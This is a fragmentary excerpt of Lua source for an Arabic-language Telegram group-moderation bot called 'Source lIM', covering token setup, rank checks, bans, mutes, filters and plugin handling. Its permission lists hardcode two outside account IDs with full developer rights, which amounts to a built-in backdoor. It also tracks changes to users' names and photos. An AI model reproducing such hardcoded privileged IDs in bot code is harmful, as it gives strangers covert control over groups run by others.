...
if res ~= 200 then
print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسلة')
else
io.write('\27[0;31m تم تفعيل التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username","@"..json.result.username)
database:set(id_server..":token",token)
end 
else
print('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم تفعيل التوكن ارسل لي التوكن الان')
end 
os.execute('lua lIM.lua')
end
if not database:get(id_server..":SUDO:ID") then 
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m') 
local SUDOID = io.read() 
if SUDOID ~= '' then 
io.write('\27[1;35m تم تفعيل ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m') 
database:set(id_server..":SUDO:ID",SUDOID) 
else 
print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم تفعيل ايدي المطور الاساسي ارسله مره اخره') 
end  
os.execute('lua lIM.lua') 
end
if not database:get(id_server..":SUDO:USERNAME") then
io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SUDO : \27[0;39;49m')
local SUDOUSERNAME = io.read():gsub('@','')
if SUDOUSERNAME ~= '' then
io.write('\n\27[1;34m تم حفظت معرف المطور :\n\27[0;39;49m')
database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
else
print('\n\27[1;34m لم يتم حفظت معرف المطور :')
end 
os.execute('lua lIM.lua')
end
...
print('\n\27[1;34m Welcome to the all-new and powerful Source lIM ')
file = io.open("lIM", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/lIM
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./lIM.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("LM", "w")  
...
sudo_users = {SUDO,966386003,1330047630}   
...
if hash or SudoBot(msg) or DevlIMW(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevlIMW(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevlIMW(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevlIMW(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevlIMW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevlIMW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevlIMW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
var = true  
elseif tonumber(user_id) == tonumber(1330047630) then
var = true  
...
local UserName = (data.username_ or "RRRRDL")
local NameUser = "◈︙من » ["..data.first_name_.."](T.me/"..UserName..")"
...
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'.json', '- عدد الجروبات التي في البوت { '..#list..'}')
end
...
File:write(t)
File:close()
sendDocument(SUDO, 0,0, 1, nil, './'..bot_id..'.json', '- عدد الجروبات التي في البوت { '..#list..'}')
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"@X_X_T")  
...
--------------------------------------------------------------------------------------------------------------
function SourcelIM(msg,data) -- بداية العمل
if msg then
...
SourcelIMr = '◈︙اهلا عزيزي\n◈︙انا بوت اسمي '..Namebot..'\n◈︙اختصاصي حمايه الكروبات\n◈︙من تكرار والسبام والتوجيه والخ…\n◈︙لتفعيلي اتبع الاخطوات…↓\n◈︙اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع »{ منشئ او المشرفين } بتفعيل فقط\n[◈︙[قناة سورس البوت](http://t.me/RRRRDL)'
end 
send(msg.chat_id_, msg.id_, SourcelIMr) 
end
end
database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
return false
end
if not DevlIMW(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevlIMW(msg) and msg.reply_to_message_id_ ~= 0  then    
...
send(msg.chat_id_, msg.id_,lIM_Msg) 
return false  
end 
if text then    
...
send(msg.chat_id_, msg.id_,'◈︙تم حفظت كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
...
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'◈︙[تحديثات البوت](t.me/RRRRDL) \n◈︙[قناه السورس](t.me/RRRRDL)')
end
...
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'◈︙مافيه مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
...
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'◈︙مافيه كروبات وهميه في البوت\n')   
else
local lIM = (w + q)
local sendok = #group - lIM
if q == 0 then
lIM = ''
else
...
send(msg.chat_id_, msg.id_,'◈︙عدد الكروبات الان » { '..#group..' }'..lIMk..''..lIM..'\n◈︙الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevlIMW(msg) then
...
usertext = '\n◈︙العضو » ['..result.title_..'](t.me/'..(username or 'RRRRDL')..')'
status  = '\n◈︙تم ترقيته مطور'
texts = usertext..status
else
texts = '◈︙مافيه حساب بهذا المعرف'
end
...
if text and text:match("^رفع مطور (%d+)$") and DevlIMW(msg) then
...
usertext = '\n◈︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'RRRRDL')..')'
status  = '\n◈︙تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevlIMW(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevlIMW(msg) then
...
local lIM1_Msg = database:get(bot_id.."lIM1:Add:Filter:Rp2"..text..msg.chat_id_)   
if lIM1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'◈︙العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'RRRRDL')..') \n◈︙'..lIM1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_, msg.id_, "◈︙تم حفظت الاسم")
return false
end 
...
t = 'ههَلا عمَࢪي user نوࢪت ڪݛۅب' 
end 
t = t:gsub('name',result.first_name_) 
t = t:gsub('user',('@'..result.username_ or 'مافيه')) 
send(msg.chat_id_, msg.id_,'['..t..']')
end,nil) 
end 
end 
...
send(msg.chat_id_, msg.id_,'◈︙تم حفظت ترحيب الكروب')
return false   
end
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_,msg.id_,"◈︙تم حفظت الرابط بنجاح")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
--------------------------------------------------------------------------------------------------------------
if lIM_Msg and not Special(msg) then  
local lIM_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if lIM_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"◈︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n◈︙["..lIM_Msg.."] \n")
else
send(msg.chat_id_,0,"◈︙العضو : {["..data.first_name_.."](T.ME/RRRRDL)}\n◈︙["..lIM_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "◈︙عذرا » {["..data.first_name_.."](T.ME/RRRRDL)}\n◈︙ياطيب منعت الملصق ماترسلها \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevlIMW(msg) then
...
send(msg.chat_id_, msg.id_,'◈︙المجموعة مفعله من قبل يالطيب!')
else
sendText(msg.chat_id_,'\n◈︙من » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..') فعلت المجموعة \n ورفعت كل الادمنية\n{'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevlIMW(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevlIMW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '◈︙حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevlIMW(msg) then  
...
send(msg.chat_id_, msg.id_, '◈︙ابشر عطلت الاضافات')
database:set(bot_id.."AL:Sre:stats","❌")
end
...
send(msg.chat_id_, msg.id_, '◈︙ابشر كتمت الاسم '..BlNe)
database:sadd(bot_id.."lIM:blocname"..msg.chat_id_, BlNe)
end
...
function X_X_T_name(t1,t2)
if t2.id_ then 
name_lIM = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_lIM then 
names_lIM = database:smembers(bot_id.."lIM:blocname"..msg.chat_id_) or ""
if names_lIM and names_lIM[1] then 
for i=1,#names_lIM do 
if name_lIM:match("(.*)("..names_lIM[i]..")(.*)") then 
...
bnnaGet(msg.sender_user_id_, X_X_T_name)
end
...
database:set(bot_id.."lIM:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."lIM:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."lIM:teh"..msg.chat_id_) or "مافيه توحيد"
local s2 = database:get(bot_id.."lIM:nump"..msg.chat_id_) or 5
...
local lIM_nnn = database:get(bot_id.."lIM:nump"..msg.chat_id_) or 5
local lIM_nnn2 = database:get(bot_id.."lIM:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(lIM_nnn2) == tonumber(lIM_nnn) or tonumber(lIM_nnn2) > tonumber(lIM_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."lIM:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "◈︙عزيزي >>["..lIM2.username_.."](https://t.me/"..(lIM2.username_ or "RRRRDL")..")\n◈︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."lIM:teh"..msg.chat_id_).."} بجانب اسمك\n◈︙عدد المحاولات المتبقيه {"..(tonumber(lIM_nnn) - tonumber(lIM_nnn2)).."}")
end
end
end
end
...
local lIMChengName = database:get(bot_id.."lIM:Cheng:Name"..data.id_)
if not data.first_name_ then 
if lIMChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..lIMChengName..']')
database:del(bot_id.."lIM:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
...
database:set(bot_id.."lIM:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local lIMChengUserName = database:get(bot_id.."lIM:Cheng:UserName"..data.id_)
if not data.username_ then 
if lIMChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..lIMChengUserName..']')
database:del(bot_id.."lIM:Cheng:UserName"..data.id_) 
end
end
...
database:set(bot_id.."lIM:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
database:set(bot_id.."lIM:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
Text = "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴏᴜʀᴄʀ 𝙻𝙸𝙼\n\n[-  𝙻𝙸𝙼 𝚂𝙾𝚄𝚁𝙲𝙴  .](http://t.me/RRRRDL)\n\n[-  𝙻𝙸𝙼 ᴅᴇᴠᴇʟᴏᴘᴇʀ  .](http://t.me/X_X_T)\n\n[-  𝙻𝙸𝙼 ᴅᴇᴠᴇʟᴏᴘᴇʀ²  .](http://t.me/@Y_O_Q)\n\n[-  𝚃𝚆𝙰𝚂𝙾𝙻 .](http://t.me/FYQBOT)"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✫: 𝙻𝙸𝙼 sᴏᴜʀᴄʀ .',url="t.me/RRRRDL"}},
}
...
if text == 'رفع نسخه الاحتياطيه' and DevlIMW(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_,'◈︙تم حفظت الامر')  
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'◈︙من » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'RRRRDL')..') \n◈︙تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'◈︙من » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'RRRRDL')..') \n◈︙تـم قفـل التاك بالكتم ')
end,nil)   
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevlIMW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^حظر عام @(.*)$")  and DevlIMW(msg) then
...
if text and text:match("^حظر عام (%d+)$") and DevlIMW(msg) then
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevlIMW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevlIMW(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevlIMW(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevlIMW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevlIMW(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevlIMW(msg) then
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevlIMW(msg) then
database:del(bot_id..'Sudo:User')
send(msg.chat_id_, msg.id_, "\n◈︙تم مسحت قائمة المطورين  ")
end
if text == ("المطورين") and DevlIMW(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n◈︙قائمة مطورين البوت \n↫ ┄┄┄┄┄┄┄┄┄┄┄┄ ↬\n"
...
if database:get(bot_id.."X_X_T:admin:Time"..msg.chat_id_) then 
return
 send(msg.chat_id_, msg.id_,"استنا دقيقه ياطيب")
end
database:setex(bot_id..'X_X_T:admin:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."X_X_T:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"استنا دقيقه ياطيب")
end
...
if text == 'الملفات' and DevlIMW(msg) then
t = '◈︙ملفات السورس ليم ↓\n↫ ┄┄┄┄┄┄┄┄┄┄┄┄ ↬ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
...
if DevlIMW(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/lIMTEAM/Files_lIM/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n◈︙اهلا بك في متجر ملفات ليم\n◈︙ملفات السورس ↓\n↫ ┄┄┄┄┄┄┄┄┄┄┄┄ ↬\n\n"
local TextE = "\n↫ ┄┄┄┄┄┄┄┄┄┄┄┄ ↬\n◈︙علامة تعني { ✓ } ملف مفعل\n◈︙علامة تعني { ✘ } ملف معطل\n◈︙قناة سورس ليم ↓\n".."◈︙[اضغط هنا لدخول](t.me/RRRRDL) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_,"◈︙مافيه اتصال من ال api \n") 
end
return false
end
end

if text and text:match("^(تعطيل) (.*)(.lua)$") and DevlIMW(msg) then
...
send(msg.chat_id_, msg.id_,"◈︙عذرا الملف لايدعم سورس ليم \n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevlIMW(msg) then
...
if text == "مسح الملفات" and DevlIMW(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_,"◈︙تم مسحت الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevlIMW(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevlIMW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local UserName = (b.username_ or "RRRRDL")
...
function Function_lIM(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_lIM, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_lIM, nil)
return false 
end
...
Reply_Status(msg,result.sender_user_id_,"reply","◈︙تم نزلته من المطور ثانويين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_lIM, nil)
return false 
end
...
Reply_Status(msg,result.id_,"reply","◈︙تم نزلته من المطور ثانويين")  
else
send(msg.chat_id_, msg.id_,"◈︙مافيه حساب بهذا المعرف")
end
end
...
Reply_Status(msg,userid,"reply","◈︙تم نزلته من المطور ثانويين")  
return false 
end
...
send(msg.chat_id_, msg.id_,'◈︙ابشر عطلت الرفع') 
return false
end
...
send(msg.chat_id_, msg.id_,'◈︙ابشر عطلت الطرد') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
...
send(msg.chat_id_, msg.id_,'◈︙ما عندي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'◈︙ارفعني ادمن اول شي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n◈︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'RRRRDL')..')'
...
send(msg.chat_id_, msg.id_, '◈︙تم مسحت المميزين')
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n◈︙لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'RRRRDL')..')'
status  = '\n◈︙تم نزلته من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n◈︙العضو » '..userid..''
...
send(msg.chat_id_, msg.id_, '◈︙تم مسحت جميع المطايه')
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n◈︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'RRRRDL')..')'
...
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'◈︙ابشر عطلت الحظر') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
...
send(msg.chat_id_, msg.id_, '◈︙تم مسحت المكتومين')
end
...
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n◈︙هييه ماتقدر تكتم ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'◈︙ارفعني ادمن اول شي !') 
return false  
...
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n◈︙هييه ماتقدر تكتم ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"◈︙عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
...
if text == 'تفعيل جلب النسخه' and DevlIMW(msg) then  
  database:setex(bot_id.."send:file:Groups1",18000,true) 
send(msg.chat_id_, msg.id_,'◈︙تم تفعيل جلب النسخه الاحتياطيه')
return false
end

if text == 'تعطيل جلب النسخه' and DevlIMW(msg) then  
  database:del(bot_id.."send:file:Groups") 
send(msg.chat_id_, msg.id_,'ابشر عطلت جلب النسخه الاحتياطيه')
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n◈︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'RRRRDL')..')'
status  = '\n◈︙ابشر كتمت لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
...
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n◈︙هييه ماتقدر تكتم ( '..Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'◈︙ارفعني ادمن اول شي !') 
return false  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n◈︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WviivW')..')'
status  = '\n◈︙الايدي » '..result.sender_user_id_..'\n◈︙تم نزلته ادمن من الكروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
...
send(msg.chat_id_,msg.id_,"◈︙ياطيب مقفل التثبيت")  
return false  
end
...
send(msg.chat_id_,msg.id_,"◈︙ما فيه رساله مثبته")  
...
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"◈︙ياطيب مقفل الثبيت")  
return false  
end
...
send(msg.chat_id_, msg.id_,"◈︙ابشر عطلت الرابط") 
return false end
end
...
send(msg.chat_id_, msg.id_,"◈︙ابشر عطلت الصوره") 
return false end
end
if text == "الرابط" then 
...
if link then                              
send(msg.chat_id_,msg.id_,'𝙻𝙸𝙽𝙺 𝙶𝚁𝙾𝚄𝙿 𖠚\n↫ ┄┄┄┄┄┄┄┄┄┄┄┄ ↬\n ['..link..']')                          
else                
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
...
linkgp = ' ◈︙مافيه رابط ارسل ضع رابط'
end  
...
send(msg.chat_id_,msg.id_,"◈︙تم مسحت الرابط")           
...
GetWelcome = '◈︙مافيه ترحيب عشان امسحه!'
end 
...
send(msg.chat_id_, msg.id_,'◈︙ابشر عطلت ترحيب الكروب') 
return false  
end
...
database:set(bot_id.."lIM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."lIM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"◈︙ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."lIM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."lIM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."lIM1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."lIM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"◈︙ابشر منعت الكلمه مع التحذير")  
database:del(bot_id.."lIM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."lIM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."lIM1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."lIM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"◈︙ارسل الكلمه الان")  
database:set(bot_id.."lIM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."lIM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."lIM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."lIM1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."lIM1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."lIM1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."lIM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."lIM1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."lIM1:List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_,"◈︙تم مسحت قائمه المنع")  
end
...
t = "\n◈︙قائمة المنع \n↫ ┄┄┄┄┄┄┄┄┄┄┄┄ ↬\n"
for k,v in pairs(list) do  
local lIM_Msg = database:get(bot_id.."lIM1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..lIM_Msg.."}\n"    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'◈︙تم مسحت قائمه منع المتحركات')  
end
if text == 'مسح قائمه منع الصور' and Manager(msg) then     
database:del(bot_id.."filterphoto"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'◈︙تم مسحت قائمه منع الصور')  
end
if text == 'مسح قائمه منع الملصقات' and Manager(msg) then     
database:del(bot_id.."filtersteckr"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'◈︙تم مسحت قائمه منع الملصقات')  
end
------------------

if text == 'مسح كليشه المطور' and DevlIMW(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,'◈︙تم مسحت كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevlIMW(msg) then
...
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'◈︙تم حفظت كليشة المطور')
return false
end
-----------------
...
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, "◈︙ما فيه بوتات في الكروب")
else
...
send(msg.chat_id_, msg.id_,"◈︙تم حفظت قوانين الكروب") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  
...
send(msg.chat_id_, msg.id_,"◈︙ما فيه قوانين")   
end    
end
...
if #list == 0 then
send(msg.chat_id_, msg.id_,'◈︙ما فيه صلاحيات مضافه')
return false
end
...
send(msg.chat_id_, msg.id_, "*◈︙تم مسحت الصلاحيه *\n") 
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n◈︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'RRRRDL')..')'..'\n◈︙تم رفعته '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'◈︙تم مسحت رسائلك'  )  
...
if text == 'تفعيل الاذاعه' and DevlIMW(msg) then  
...
if text == 'تعطيل الاذاعه' and DevlIMW(msg) then  
...
if not database:get(bot_id..'X_X_T:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
...
send(msg.chat_id_,msg.id_,'◈︙تم حذفت {'..num..'}')  
database:setex(bot_id..'X_X_T:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'ليم').."" then  
...
if database:get(bot_id..'Bc:Bots') and not DevlIMW(msg) then 
...
if text == ("مسح ردود المطور") and DevlIMW(msg) then 
...
send(msg.chat_id_, msg.id_,"◈︙تم مسحت ردود المطور")
end

if text == ("ردود المطور") and DevlIMW(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
